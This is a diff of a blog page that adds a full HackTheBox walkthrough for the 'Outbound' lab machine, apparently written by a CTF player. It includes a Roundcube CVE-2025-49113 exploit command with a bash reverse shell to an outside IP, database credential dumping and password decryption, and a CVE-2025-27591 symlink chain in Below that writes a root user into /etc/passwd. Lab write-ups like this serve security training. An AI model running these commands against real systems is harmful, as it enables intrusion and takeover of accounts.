@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Outbound - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Outbound.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Outbound machine from HackTheBox - Easy difficulty level">
+    <meta name="description" content="Detailed writeup for Outbound machine from HackTheBox - Easy difficulty level">
     <meta name="keywords" content="HackTheBox, Outbound, Easy, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,220 @@
         <h1 class="writeup-title">Outbound</h1>
         <div class="writeup-metadata">
             <span class="difficulty easy">Easy</span>
-            <span class="date">Active machine</span>
+            <span class="date">November 15, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="Outbound" src="../images/Outbound/pwned.png" /></p>
-<p>Outbound is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Outbound retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/Outbound/pwned.png" /></p>
+<p>Outbound was an easy-difficulty Linux box featuring a vulnerable Roundcube webmail instance and a privilege escalation through an insecure system monitoring tool.
+Initial access was gained by exploiting CVE-2025-49113, a PHP deserialization vulnerability in Roundcube 1.6.10, using provided credentials for tyler (LhKL1o9Nm3X2) to achieve remote code execution as www-data.</p>
+<p>I enumerated the Roundcube MySQL database using hardcoded credentials found in config.inc.php (roundcube:RCDBPass2025) and extracted base64-encoded session data containing encrypted IMAP passwords.
+Using the des_key from the configuration file, I performed Triple-DES decryption with proper IV extraction to recover jacob's plaintext password (595mO8DmwGeD). While SSH authentication failed, I successfully used su to pivot to jacob's account on the existing shell.</p>
+<p>Reading jacob's local mail revealed a password reset message from tyler containing new credentials (gY4Wr3a1evp4), which granted SSH access and the user flag.
+A second email from mel indicated the Below system monitoring tool had been enabled with elevated privileges.</p>
+<p>I exploited CVE-2025-27591 in Below, which creates world-writable directories and log files at /var/log/below. After removing error_root.log and creating a symlink to /etc/passwd, I triggered Below's record function with sudo to write an error, which modified /etc/passwd permissions to 666. I then appended a malicious root-equivalent user entry with a SHA-512 password hash generated via OpenSSL (attacker:password), bypassing the need for /etc/shadow modifications, and obtained root access by switching to the newly created account.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Outbound/nmap.png" /></p>
+<p>Initial nmap scan reveals SSH on 22, and a Roundcube instance running on port 80.</p>
+<h2>CVE-2025-49113 Exploitation</h2>
+<p><img alt="roundcube" src="../images/Outbound/roundcube.png" /></p>
+<p>This is an assumed breach scenario, which means that I already have a set of credentials to work with.</p>
+<p><code>tyler | LhKL1o9Nm3X2</code></p>
+<p>Logging into Roundcube with these credentials works and grants access to Tyler's mail. It is empty, though, so I'll check the Roundcube version with the <code>about</code> button.</p>
+<p><img alt="about" src="../images/Outbound/about.png" /></p>
+<p><code>Roundcube 1.6.10</code> is the version. I'll look around the web for vulnerabilities I could use.</p>
+<pre class="codehilite"><code>https://www.offsec.com/blog/cve-2025-49113/
+
+https://github.com/hakaioffsec/CVE-2025-49113-exploit
+</code></pre>
+
+<p>This vulnerability allows for RCE through a PHP object deserialization flaw triggered by improper validation of the <code>_from</code> parameter in <code>program/actions/settings/upload.php</code></p>
+<p><code>php CVE-2025-49113.php http://mail.outbound.htb tyler 'LhKL1o9Nm3X2' "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.187/9001 0&gt;&amp;1'"</code></p>
+<p><img alt="shell" src="../images/Outbound/shell.png" /></p>
+<p>This results in a shell as <code>www-data</code></p>
+<h2>Pillaging the Roundcube DB</h2>
+<p>After landing a shell, I'll look through the <code>var/www/</code> directory to see files related to the website. Oftentimes, there will be some hardcoded credentials/secrets or .env files.</p>
+<p><img alt="config" src="../images/Outbound/config.png" /></p>
+<p>In the config directory, there is a <code>config.inc.php</code> file, which I'll read right now.</p>
+<p><img alt="db" src="../images/Outbound/db.png" /></p>
+<p><code>roundcube | RCDBPass2025</code></p>
+<p>The MySQL bin comes in with Roundcube, meaning I don't need to worry whether it is available or not.</p>
+<p><code>mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e "use roundcube; select * from users"</code></p>
+<p><img alt="database" src="../images/Outbound/database.png" /></p>
+<p>There are 3 entries, with unusual-looking client hashes present.</p>
+<pre class="codehilite"><code>jacob | hpLLqLwmqbyihpi7
+
+mel | GCrPGMkZvbsnc3xv
+
+tyler | vQ2pWN75zEK6YNcq
+</code></pre>
+
+<p>These didn't seem useful for now, so I left them. I continued my search of the database.</p>
+<h3>Decrypting the Roundcube session passwords</h3>
+<p><code>mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e "use roundcube; select * from session"</code></p>
+<p><img alt="sessions" src="../images/Outbound/sessions.png" /></p>
+<p>This table contains session data and base64-encoded variables. Decoding each entry from top to bottom reveals 2 sets of credentials.</p>
+<pre class="codehilite"><code>jacob | Pass: L7Rv00A8TuwJAr67kITxxcSgnIk25Am/ | auth_secret: pYqv6maI9HxDL5GhcCd8JaQQW
+
+tyler | Pass: mxjdUjfgfKYESOO1I99JKAwMDPQ77DpF | auth_secret: na4l8F3WMtmtgRxkpEmqSq27WI
+</code></pre>
+
+<p>The config file revealed the <code>des_key</code> used for encrypting the IMAP passwords of users.</p>
+<pre class="codehilite"><code>&lt;SNIP&gt;
+// This key is used to encrypt the users imap password which is stored
+// in the session record. For the default cipher method it must be
+// exactly 24 characters long.
+// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
+$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
+&lt;SNIP&gt;
+</code></pre>
+
+<p>When stored in the session database or in a persistent cookie, the IMAP password is encrypted with a 3DES(DES-EDE3-CBC) algorithm. I have all the necessary pieces, so I'll perform the decryption using CyberChef.</p>
+<p><img alt="tohex" src="../images/Outbound/tohex.png" /></p>
+<p>The IV length in 3DES is <code>8 bytes</code>. I'll strip off the first 8 bytes from this output.</p>
+<p><code>2fb46fd3403c4eec &lt; IV | 0902bebb9084f1c5c4a09c8936e409bf &lt; data</code></p>
+<p>For the <code>Triple-DES Decrypt</code> operation, I will use these values:</p>
+<pre class="codehilite"><code>Triple-DES Decrypt
+
+
+Key: rcmail-!24ByteDESkey*Str | UTF-8
+
+IV: 2fb46fd3403c4eec | HEX
+
+Mode: CBC
+
+Input: HEX
+
+Output: RAW
+</code></pre>
+
+<p><img alt="decrypted" src="../images/Outbound/decrypted.png" /></p>
+<p><code>jacob | 595mO8DmwGeD</code></p>
+<p>This returns a plaintext password for Jacob. I will try to SSH into the box as him.</p>
+<p><img alt="fail" src="../images/Outbound/fail.png" /></p>
+<p>However, this does not succeed. I still have my www-data shell, so I'll try to swap my user to jacob there.</p>
+<p><img alt="jacob" src="../images/Outbound/jacob.png" /></p>
+<h2>Logging in with SSH as jacob</h2>
+<p>The only thing in Jacob's home directory is the mail directory. Inside, there are 2 mails.</p>
+<pre class="codehilite"><code>From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
+Return-Path: &lt;tyler@outbound.htb&gt;
+X-Original-To: jacob
+Delivered-To: jacob@outbound.htb
+Received: by outbound.htb (Postfix, from userid 1000)
+        id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
+To: jacob@outbound.htb
+Subject: Important Update
+MIME-Version: 1.0
+Content-Type: text/plain; charset=&quot;UTF-8&quot;
+Content-Transfer-Encoding: 8bit
+Message-Id: &lt;20250607140058.B32C410248D@outbound.htb&gt;
+Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
+From: tyler@outbound.htb
+X-IMAPbase: 1749304753 0000000002
+X-UID: 1
+Status: RO
+X-Keywords:                                                                     
+Content-Length: 233
+
+Due to the recent change of policies your password has been changed.
+
+Please use the following credentials to log into your account: gY4Wr3a1evp4
+
+Remember to change your password when you next log into your account.
+
+Thanks!
+
+Tyler
+
+---
+
+From mel@outbound.htb  Sun Jun 08 12:09:45 2025
+Return-Path: &lt;mel@outbound.htb&gt;
+X-Original-To: jacob
+Delivered-To: jacob@outbound.htb
+Received: by outbound.htb (Postfix, from userid 1002)
+        id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
+To: jacob@outbound.htb
+Subject: Unexpected Resource Consumption
+MIME-Version: 1.0
+Content-Type: text/plain; charset=&quot;UTF-8&quot;
+Content-Transfer-Encoding: 8bit
+Message-Id: &lt;20250608120945.1487E22C@outbound.htb&gt;
+Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
+From: mel@outbound.htb
+X-UID: 2
+Status: O
+X-Keywords:                                                                      
+Content-Length: 261
+
+We have been experiencing high resource consumption on our main server.
+For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
+Please inform us immediately if you notice any irregularities.
+
+Thanks!
+
+Mel
+</code></pre>
+
+<p>The first email contains a new password set for Jacob, so I'll try SSH again with this one.</p>
+<p><img alt="user" src="../images/Outbound/user.png" /></p>
+<h1>Root flag</h1>
+<p><img alt="sudol" src="../images/Outbound/sudol.png" /></p>
+<p>Jacob can run <code>Below</code> as root. This is a tool for recording and displaying system data.</p>
+<p><img alt="below" src="../images/Outbound/below.png" /></p>
+<h2>Trying to inject an SSH key into root's authorized_keys file</h2>
+<p>Looking through the web for CVEs related to Below, I found CVE-2025-27591 after a bit of searching.</p>
+<p><code>https://www.wiz.io/vulnerability-database/cve/cve-2025-27591</code></p>
+<p>This vulnerability exists because the Below service creates a world-writable directory (777) at /var/log/below, meaning that anyone can write into this directory.</p>
+<p><img alt="writable" src="../images/Outbound/writable.png" /></p>
+<p>Additionally, Below creates a log file writable by anyone at /var/log/below/error_root.log. With these permissions, I can remove this file and create a symlink to protected files like <code>/root/.ssh/authorized keys</code>, and this affected file will now have <code>666</code> permissions, which will allow me to modify it.</p>
+<p>To exploit this, I'll first remove the error_root.log file, then I will create a symlink in its place pointing to <code>/root/.ssh/authorized keys</code></p>
+<pre class="codehilite"><code>rm /var/log/below/error_root.log
+
+ln -s /root/.ssh/authorized_keys /var/log/below/error_root.log
+</code></pre>
+
+<p>Now I just need something to make Below write into the error log. I have the following options to choose from:</p>
+<pre class="codehilite"><code>Usage: below [OPTIONS] [COMMAND]
+
+Commands:
+  live      Display live system data (interactive) (default)
+  record    Record local system data (daemon mode)
+  replay    Replay historical data (interactive)
+  debug     Debugging facilities (for development use)
+  dump      Dump historical data into parseable text format
+  snapshot  Create a historical snapshot file for a given time range
+  help      Print this message or the help of the given subcommand(s)
+
+Options:
+      --config &lt;CONFIG&gt;  [default: /etc/below/below.conf]
+  -d, --debug            
+  -h, --help             Print help
+</code></pre>
+
+<p>I picked the record option first, because it looked like the fastest one to check.</p>
+<p><img alt="fail2" src="../images/Outbound/fail2.png" /></p>
+<p>This did not work, though. It could be because the authorized_keys file had special protections put in place. It for sure does exist, because I got a permission error.</p>
+<h2>Creating an arbitrary user with CVE-2025-27591</h2>
+<p>I decided to switch my approach. Instead of writing to root's files, I'll modify /etc/passwd directly by appending a new user at the end. First, I need a legitimate password to make my user valid without touching /etc/shadow. This can be done with OpenSSL from my box.</p>
+<p><code>openssl passwd -6 -salt salt password</code></p>
+<p><img alt="hash" src="../images/Outbound/hash.png" /></p>
+<p>I'll craft an entry for /etc/passwd with this user hash, effectively bypassing the need for /etc/shadow. If I were to set an X instead of the hash, I would have to create an entry in /etc/shadow as well, which is not possible here due to file permissions.</p>
+<p><code>echo 'attacker:$6$salt$IxDD3jeSOb5eB1CX5LBsqZFVkJdido3OUILO5Ifz5iwMuTS4XMS130MTSuDDl3aCI6WouIL9AjRbLCelDCy.g.:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd</code></p>
+<p>The whole attack will now look like this:</p>
+<pre class="codehilite"><code>rm /var/log/below/error_root.log &amp;&amp; ln -s /etc/passwd /var/log/below/error_root.log &lt;- removes the log, and creates a symlink to /etc/passwd in its place
+
+sudo /usr/bin/below record &lt;- generates an error, which is written into the symlink and effectively changes the target file permissions to 666(writable by all users)
+
+echo 'attacker:$6$salt$IxDD3jeSOb5eB1CX5LBsqZFVkJdido3OUILO5Ifz5iwMuTS4XMS130MTSuDDl3aCI6WouIL9AjRbLCelDCy.g.:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd &lt;- appends a malicious user with the password of 'password' and a salt of 'salt' (SHA512) to /etc/passwd
+
+su attacker &lt;- changes the current user to attacker
+</code></pre>
+
+<p><img alt="root" src="../images/Outbound/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
